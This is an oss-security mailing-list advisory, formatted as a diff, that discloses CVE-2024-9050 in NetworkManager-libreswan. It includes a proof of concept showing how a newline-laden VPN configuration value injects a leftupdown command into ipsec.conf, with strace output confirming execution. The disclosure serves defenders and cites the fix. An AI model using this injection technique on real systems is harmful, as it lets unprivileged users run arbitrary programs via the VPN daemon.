@@ -1,0 +1,143 @@
+
+Message-ID: <CACQFvQHh9Ci5gkJ-a5CuWVQfNcK-TQOHS_ce6ufjjrsyv99xYw@mail.gmail.com>
+Date: Fri, 25 Oct 2024 02:28:48 +0200
+From: Lubomir Rintel <lrintel@...hat.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2024-9050: NetworkManager-libreswan IPSec VPN plugin local code execution
+
+Hi,
+
+We discovered and fixed a security issue in NetworkManager-libreswan,
+where we fail to sanitize the VPN configuration from a local unprivileged
+user and pass it directly to Libreswan upon an attempt to activate a
+connection.
+
+It's fixed in NetworkManager-libreswan.git version 1.2.24, in
+commit dcf8acfb25bd ('all: rework formatting of ipsec.conf') [1]
+
+[1] <https://gitlab.gnome.org/GNOME/NetworkManager-libreswan/-/commit/dcf8acfb25bd31e4b8cbd20c229da660238b5c1b>
+
+The issue is assigned CVE-2024-9050. Details follow.
+
+------------------------------ 8< ------------------------------
+
+The libreswan connection configuration is simple key=value format, but we
+fail to check for or escape special characters, including newlines, which
+makes it possible for the user to trick us to treat values as key.
+
+Unfortunately, there's one particular key that takes an executable command
+as an argument: leftupdown (couldn't find more in ipsec.conf(5)). We
+normally use it to specify the NM-libreswan callback, that would pass L3
+configuration back to NM. It can be abused to execute arbitrary program.
+
+Here's how (notice hostaddrfamily has a funny value that spans multiple
+lines, including a leftupdown=/bin/true, which is plays the role of PoC
+exploit payload):
+
+  # nmcli -f vpn.data --show-secrets c show is
+  vpn.data: hostaddrfamily = ipv4
+  leftupdown=/bin/true
+  ikev2=never
+  leftxauthclient=yes
+  leftusername=username
+  phase2alg=aes256-sha1
+  authby=secret
+  left=%defaultroute
+  leftmodecfgclient=yes
+  right=172.31.79.2
+  conn ign, leftid = groupname, leftxauthusername = username,
+pskinputmodes = save, pskvalue-flags = 0, right = 172.31.79.2,
+rightsubnet = 10.0.2.0/24, xauthpassword-flags = 0,
+xauthpasswordinputmodes = save
+  # strace -f -p$(pidof pluto) -eexecve &
+  # nmcli c up is &
+  ...
+  strace: Process 103675 attached
+  [pid 103675] execve("/bin/true", ["/bin/true"], 0x558af10a3e80 /* 62
+vars */) = 0
+
+This is how it's serialized in a keyfile:
+
+  # cat /etc/NetworkManager/system-connections/is.nmconnection
+  [connection]
+  id=is
+  uuid=418b5af9-63c6-4dfa-9d57-ff3dc3e00cfd
+  type=vpn
+  autoconnect=false
+  timestamp=1726676158
+
+  [vpn]
+  leftid=groupname
+  hostaddrfamily=ipv4\n leftupdown=/bin/true\n ikev2=never\n
+leftxauthclient=yes\n leftusername=username\n phase2alg=aes256-sha1\n
+authby=secret\n left=%defaultroute\n leftmodecfgclient=yes\n
+right=172.31.79.2\nconn ign
+  leftxauthusername=username
+  pskinputmodes=save
+  pskvalue-flags=0
+  right=172.31.79.2
+  rightsubnet=10.0.2.0/24
+  xauthpassword-flags=0
+  xauthpasswordinputmodes=save
+  service-type=org.freedesktop.NetworkManager.libreswan
+
+  [vpn-secrets]
+  pskvalue=ipsecretkek
+  xauthpassword=password
+
+  [ipv4]
+  method=auto
+
+  [ipv6]
+  addr-gen-mode=stable-privacy
+  method=auto
+
+  [proxy]
+
+This is what gets passed to pluto (libreswan ipsec daemon), with an
+inline comment:
+
+  conn 418b5af9-63c6-4dfa-9d57-ff3dc3e00cfd
+   aggrmode=yes
+   leftid=@...upname
+   hostaddrfamily=ipv4        # Our injected content is here.
+   leftupdown=/bin/true       # This line gets the payload called.
+   ikev2=never                # These lines are there so that
+   leftxauthclient=yes        # the connection is well formed,
+   leftusername=username      # and progresses to the point
+   phase2alg=aes256-sha1      # it calls the script.
+   authby=secret              # The last "conn ign" line
+   left=%defaultroute         # shifts the other settings,
+   leftmodecfgclient=yes      # including the original leftupdown
+   right=172.31.79.2          # into a separate bogus connection,
+  conn ign                    # so that they're effectively ignored.
+   authby=secret
+   left=%defaultroute
+   leftmodecfgclient=yes
+   leftupdown=\"/usr/libexec/nm-libreswan-service-helper 7 103758
+org.freedesktop.NetworkManager.libreswan.Connection_31\"
+   right=172.31.79.2
+   rightmodecfgserver=yes
+   modecfgpull=yes
+   rightsubnet=10.0.2.0/24
+   leftxauthclient=yes
+   leftusername=username
+   remote-peer-type=cisco
+   rightxauthserver=yes
+   ike=aes256-sha1;modp1536
+   phase2alg=aes256-sha1
+   ikelifetime=24h
+   salifetime=24h
+   rekey=yes
+   keyingtries=1
+   ikev2=never
+   nm-configured=yes
+   auto=add
+
+I'm not seeing SELinux AVC denials.
+
+------------------------------ 8< ------------------------------
+
+Take care,
+Lubo
+
